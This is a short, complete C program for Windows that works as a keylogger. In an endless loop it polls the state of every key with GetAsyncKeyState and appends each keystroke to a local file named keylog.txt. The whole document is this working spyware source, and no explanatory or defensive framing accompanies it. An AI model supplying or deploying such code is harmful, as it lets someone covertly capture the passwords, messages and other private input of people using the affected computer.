#include <stdio.h>
#include <windows.h>

int main() {
    FILE *logFile;
    short key;
    logFile = fopen("keylog.txt", "a+");  // Append mode

    while (1) {
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                fprintf(logFile, "%c", key);
                fflush(logFile);
            }
        }
        Sleep(10);  // Reduce CPU usage
    }

    fclose(logFile);
    return 0;
}
